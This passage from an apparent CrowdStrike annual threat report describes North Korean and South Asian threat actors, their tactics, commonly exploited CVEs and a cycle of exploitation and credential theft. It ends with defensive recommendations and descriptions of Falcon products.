the\ndeployment of several new LABYRINTH CHOLLIMA tools during the year.\nNew tooling does not appear to represent a significant deviation in technical\nsophistication from previously observed LABYRINTH CHOLLIMA implants; however,\nthere appears to be an emphasis on operational security and defeating signaturebased detections with these new tools. For instance, both NedDownloader and\n_UnderGround RAT — as well as an unnamed malicious PDF viewer — rely on_\ntrojanized variants of legitimate applications, techniques that allow LABYRINTH\nCHOLLIMA to effectively avoid YARA detections and automated malware analysis in\nsandbox environments. Tooling has also placed greater emphasis on cross-platform\ncoverage, with multiple new LABYRINTH CHOLLIMA tools now targeting MacOS\nand Linux operating systems, in addition to Windows.\n\nLABYRINTH CHOLLIMA also began to rely heavily on LinkedIn personas as an\nintrusion vector in 2020. Across operations targeting the defense, media, financial\nand healthcare sectors, LABYRINTH CHOLLIMA has used LinkedIn profiles\n\n\n-----\n\n### N. KOREA\n\ndisguised as human resources recruiters to contact targets. Following initial contact,\nthe adversary attempts to move the conversation to an encrypted communications\nchannel, such as WhatsApp or Telegram, where it sends a malicious document —\noften disguised as a job description for a lucrative opportunity — that will retrieve\nadditional payloads. To make personas appear legitimate and to directly interact\nwith targets without raising suspicion, this tactic requires significant research and\npreparation, highlighting the level of effort LABYRINTH CHOLLIMA makes in order\nto successfully infiltrate an organization.\n\n###### Shift in Currency Generation Strategy\n\nDPRK adversaries have conducted cyber-enabled theft since at least 2015 to evade\ninternational and U.S. economic sanctions and generate a stream of funding to\nsupport other state initiatives. In 2020, CrowdStrike Intelligence observed VELVET\nCHOLLIMA, LABYRINTH CHOLLIMA and STARDUST CHOLLIMA continue to\nengage in currency generation operations (Table 8).\n\nActor Currency Generation TTPs\n\nDeployment of malicious cryptocurrency applications\n\nLABYRINTH Card skimming\nCHOLLIMA Ransomware\n\nLikely data extortion\n\nSTARDUST Deployment of malicious cryptocurrency application\nCHOLLIMA Suspected targeting of cryptocurrency exchanges\n\nTargeting of cryptocurrency exchanges\n\nVELVET\n\n\u0007Attempted credential theft of cryptocurrency wallets with malicious\n\nCHOLLIMA\n\nAndroid application\n\n**Table 8. Currency Generation Activity Seen From DPRK Adversaries in 2020**\n\nSTARDUST CHOLLIMA has historically been the most aggressive DPRK adversary\nin currency generation operations, targeting key elements of the global financial\necosystem such as the SWIFT international money wiring protocol, ATM networks,\nand payment processors, racking up large payouts in the tens of millions of U.S.\ndollars. In 2020, CrowdStrike Intelligence observed STARDUST CHOLLIMA appear to\nshift from operations targeting large financial institution intrusions and move toward\ncryptocurrency exchanges. This trend runs parallel to VELVET CHOLLIMA and\nLABYRINTH CHOLLIMA operations, which have similarly targeted cryptocurrency\nexchanges and have increasingly relied on eCrime tactics such as JavaScript card\nskimming, cryptocurrency wallet credential theft, and deployment of ransomware.\n\n|Actor LABYRINTH CHOLLIMA|Currency Generation TTPs Deployment of malicious cryptocurrency applications Card skimming Ransomware Likely data extortion|\n|---|---|\n|STARDUST CHOLLIMA|Deployment of malicious cryptocurrency application Suspected targeting of cryptocurrency exchanges|\n|VELVET CHOLLIMA|Targeting of cryptocurrency exchanges \u0007Attempted credential theft of cryptocurrency wallets with malicious Android application|\n\n\n-----\n\n### N. KOREA\n\nDPRK’s focus on the acquisition of cryptocurrency and the increasing adoption of\neCrime tradecraft are logical developments; the environments of cryptocurrency\nexchanges are typically not as hardened as those of traditional financial\ninstitutions, and illicitly obtained cryptocurrency is much easier to move and launder\nanonymously, likely making it a preferred cashout vector versus fiat currencies. The\nuse of criminal tooling and tradecraft further obfuscates attribution efforts and can\navoid notice by security defenders looking for sophisticated attacks.\n\n###### Outlook\n\nIn 2020, the North Korean economy contracted acutely, putting the already\nimpoverished country into the worst economic situation it has faced since the\nfamines of the late 1990s. This contraction is due primarily to an abrupt cessation\nin trade with China, which resulted from Pyongyang’s closure of its border with\nChina in January 2020 to prevent the spread of COVID-19 into the country. These\nissues have been compounded by severe typhoons and flooding throughout Q3\n2020, which acutely decreased agricultural yield. In the absence of foreign aid and\nsanctions relief, these disruptions in the agricultural supply chain and the inability to\nimport food from China put DPRK at the highest risk of domestic famine and food\ninsecurity in decades.\n\nCurrency generation operations will therefore likely increase over the next year\nto compensate for the economic downturn and serve as a lifeline for the country.\nMoreover, DPRK adversaries may increase economic espionage operations\nspecifically focused against the agricultural sector in an attempt to steal technology\nthat could ameliorate some of the effects of an impending food shortage.\n\nThe DPRK government is likely to continue to pursue economic sanctions relief\nand foreign aid from the international community. Diplomatic maneuvering will likely\ndrive increased espionage activity aimed at the Korean foreign policy community, as\nDPRK’s leadership seeks to assure a decision advantage in negotiations. COVID-19\nwill also likely continue to affect DPRK through the majority of 2021. CrowdStrike\nIntelligence assesses that entities involved with the research, production or\ndistribution of COVID-19 therapeutics will be at a high risk of North Korean targeted\nintrusions until a vaccine is widely available in North Korea.\n\n\n-----\n\n### OTHER ADVERSARIES\n\nIn 2020, cyber-enabled regional espionage blossomed in South and Southeast\nAsia, broadening the threat landscape for organizations with operations within this\nregion. This trend was especially apparent in the increasing scope, sophistication\nand operational security of the Pakistan-based adversary MYTHIC LEOPARD, which\ndeployed multiple new malware families and the exploitation of both desktop and\nmobile operating systems. The most consistently active Indian adversary in 2020\nwas RAZOR TIGER. OCEAN BUFFALO — the only named Vietnam-based actor\ntracked by CrowdStrike — was also highly active in 2020, with operations heavily\nfocused on targets within the Southeast Asia region.\n\nActor Description\n\nThis adversary’s target scope was focused primarily on entities in\nChina and Pakistan; however, CrowdStrike Intelligence observed limited\ncircumstances in which RAZOR TIGER also conducted intrusions in the\nMiddle East and Europe.

These vulnerabilities are attractive to nation-state and eCrime\nactors because they potentially grant initial access to target networks.\n\n## T\n\nDuring 2020, CrowdStrike Intelligence observed repeated exploitation of several\ndifferent VPN services and web applications such as Microsoft SharePoint (CVE2019-0604). The compromise of these services in turn enabled “exploit chaining”\nwith other vulnerabilities for the purposes of privilege escalation and network\npivoting. Of these, known vulnerabilities in Microsoft Exchange Server (CVE-20200688) and Windows Netlogon (CVE-2020-1472) often serve to enable network\npropagation and lateral movement.\n\n###### Exposure and Reliability\n\nThe prevalence and general exposure of a vulnerable product, in addition to the\nreliability of available exploit code, largely dictate the usefulness of a vulnerability\nto threat actors. These traits apply to CVE-2019-0604 and CVE-2020-0688, which\nwere among the exploits most commonly observed by CrowdStrike during 2020.\nThese two exploits are derived from known vulnerabilities in Microsoft SharePoint\nand Exchange, respectively — services that are both widely deployed and internetfacing in the majority of environments. Furthermore, the available exploit code\nprovides consistent, reliable means for gaining initial access (CVE-2019-0604)\nor escalating privileges and control of a victim domain (CVE-2020-0688) without\nintroducing system instability.\n\n###### Interdependencies: Exploits and Credential-Based Attacks\n\nCrowdStrike Intelligence assesses that remote service and privilege escalation\nvulnerabilities enable the viability of credential-based attacks (e.g., brute forcing,\npassword spraying, credential stuffing). This assessment is made with moderate\nconfidence based on in-the-wild attacks and other reporting pertaining to\naccess brokers. Once actors have demonstrated the necessary reconnaissance,\nexploitation, and automated credential-based attack mechanisms, exploitation and\ncredential theft activities reinforce and support one another in a self-sustaining\nprocess (Figure 10).\n\n\n-----\n\n###### OR\n\nSell Accounts/Use\n\nExploit (Remote Obtain for Brute Force, Exploit (Escalate\nService) Credentials Password Spraying, Privilleges)\n\nCredential Stuffing\n\n###### OR Obtain\n\nCredentials\n\n**Figure 10. Stages of the Repetitive Exploitation and Credential Acquisition Cycle**\n\nThe process begins with the scanning/exploitation of remote services to harvest\nuser account credentials. For example, in late 2020, CVE-2018-13379 allowed for the\ndumping of user account directories from nearly 50,000 FortiOS VPNs. Even after\npatching, threat actors can often use these stolen credentials to reacquire access\nto the same targets (or to other networks where victims reused passwords) via\ncredential-based techniques. In these situations, the stolen logins also introduce the\nthreat of a privilege escalation from an authenticated user (e.g., CVE-2020-0688),\npivoting and eventual domain takeover. At this point, an adversary can obtain all Active\nDirectory accounts for future credential-based attacks as the cycle begins anew.\n\n\n-----\n\n###### Recommendations\n\n\n###### ↘\n\n These recommendations will help you proactively address potential weaknesses before they can be leveraged by attackers.\n\n\nver the past year, CrowdStrike Intelligence and CrowdStrike Falcon\nOverWatch observed adversaries not only undeterred by COVID-19\nbut seemingly spurred on by the impacts of the global pandemic.\nTargeted intrusion adversaries took action to secure valuable\n\n## O\n\ndata on vaccine research and government responses to the pandemic, and even\ncriminal adversaries like CARBON SPIDER — facing a reduction of profits due to\nthe pandemic — proved their flexibility in the face of adversity. In 2021, adversaries\nemploying BGH operations will continue to investigate methods to maximize their\nimpact on targets, likely including custom development to support non-traditional\ntargets within an organization.\n\nAs their operations mature, both eCrime and targeted intrusion adversaries will\ncontinue to develop and implement new methods to bypass detection and impede\nanalysis by researchers. Whether driven by public reporting or motivations internal\nto their respective organizations, the pursuit of operational security will almost\ncertainly include improved obfuscation methods, use of commodity tooling and\nliving-off-the-land techniques.\n\nThe challenges of 2020, including the rapid pivot to “work-from-anywhere,” have\ncaused a level of social and economic upheaval that is unprecedented in modern\ntimes. The widespread impact has not deterred cyber adversaries — in fact,\nquite the opposite has occurred. In 2020, CrowdStrike observed adversaries\nexploiting the situation, preying on the public’s fear and escalating attacks. These\nrecommendations will help you proactively address potential weaknesses before\nthey can be leveraged by attackers.\n\n**If you can’t see it, you can’t protect it. For security teams operating in today’s**\nenvironment, visibility and speed are critical for blocking attackers that have the\ncapability and intent to steal data and disrupt operations. Security teams must\nunderstand that it is their responsibility to secure their cloud environments, just as\nthey would on-premises systems. They must establish consistent visibility for all\nenvironments and proactively address potential vulnerabilities before they can be\nleveraged by attackers.\n\n**Protect identities and access. Organizations must consider multifactor**\nauthentication (MFA) on all public-facing employee services and portals as\nmandatory. In addition to MFA, a robust privilege access management process will\nlimit the damage adversaries can do if they get in, and reduce the likelihood of lateral\nmovement. Finally, Zero Trust solutions should be implemented to compartmentalize\nand restrict data access, thus reducing the potential damages from unauthorized\naccess to sensitive information.\n\n**Invest in expert threat hunting. Interactive attacks use stealthy or novel techniques**\ndesigned to bypass automated monitoring and detection. Continuous threat hunting\nis the best way to detect and prevent sophisticated or persistent attacks.\n\n\n-----\n\n**Get ahead of attackers with threat intelligence. There is a human being behind**\nevery attack. Threat intelligence helps you understand an attacker's motivation, skills\nand tradecraft so you can use this knowledge to your advantage to prevent, and\neven predict, future attacks.\n\n**Make sure you have a current cybersecurity policy that accounts for remote**\n**working. Security policies need to include access management for remote workers,**\nthe use of personal devices, and updated data privacy considerations for employee\naccess to documents and other information.\n\n**Create a culture of cybersecurity. While technology is clearly critical in the fight to**\ndetect and stop intrusions, the end user remains a crucial link in the chain to stop\nbreaches. User awareness programs should be initiated to combat the continued\nthreat of phishing and related social engineering techniques.\n\n\n-----\n\n###### About CrowdStrike\n\nCrowdStrike, a global cybersecurity leader, is redefining security for the cloud era\nwith an endpoint protection platform built from the ground up to stop breaches.\nThe CrowdStrike Falcon® platform’s single lightweight-agent architecture leverages\ncloud-scale artificial intelligence (AI) and offers real-time protection and visibility\nacross the enterprise, preventing attacks on endpoints on or off the network.\nPowered by the proprietary CrowdStrike Threat Graph®, CrowdStrike Falcon\ncorrelates over 5 trillion endpoint-related events per week in real time from across\nthe globe, fueling one of the world’s most advanced data platforms for security.\n\n###### Products and Services\n\n Endpoint Security\n\n**[FALCON INSIGHT™ | ENDPOINT DETECTION AND RESPONSE (EDR)](https://www.crowdstrike.com/endpoint-security-products/falcon-insight-endpoint-detection-response/)**\nDelivers continuous, comprehensive endpoint visibility that spans detection,\nresponse and forensics to ensure nothing is missed and potential breaches are\nstopped.\n\n**[FALCON PREVENT™ | NEXT-GENERATION ANTIVIRUS](https://www.crowdstrike.com/endpoint-security-products/falcon-prevent-endpoint-antivirus/)**\nProtects against both malware and malware-free attacks and is third-party tested\nand certified, allowing organizations to replace their AV.\n\n**[FALCON FIREWALL MANAGEMENT™ | FIREWALL MANAGEMENT](https://www.crowdstrike.com/endpoint-security-products/falcon-firewall-management/)**\nDelivers simple, centralized host firewall management making it easy to manage and\ncontrol host firewall policies.\n\n**[FALCON DEVICE CONTROL™ | USB DEVICE VISIBILITY AND CONTROL](https://www.crowdstrike.com/endpoint-security-products/falcon-endpoint-device-control/)**\nProvides the visibility and precise control required to enable safe usage of USB\ndevices across your organization.\n\n###### Threat Intelligence\n\n**[FALCON X RECON | SITUATIONAL AWARENESS](https://www.crowdstrike.com/products/threat-intelligence/falcon-x-recon/)**\nProvides visibility into the cybercriminal underground so customers can effectively\nmitigate threats to their brands, employees and sensitive data.\n\n\n-----\n\n**[FALCON X | AUTOMATED INTELLIGENCE](https://www.crowdstrike.com/endpoint-security-products/falcon-x-threat-intelligence/)**\nEnriches the events and incidents detected by the CrowdStrike Falcon® platform,\nautomating intelligence so security operations teams can make better, faster\ndecisions.\n\n**[FALCON X PREMIUM | CYBER THREAT INTELLIGENCE](https://www.crowdstrike.com/endpoint-security-products/falcon-x-threat-intelligence/premium/)**\nDelivers world-class intelligence reporting, technical analysis, malware analysis and\nthreat hunting capabilities.
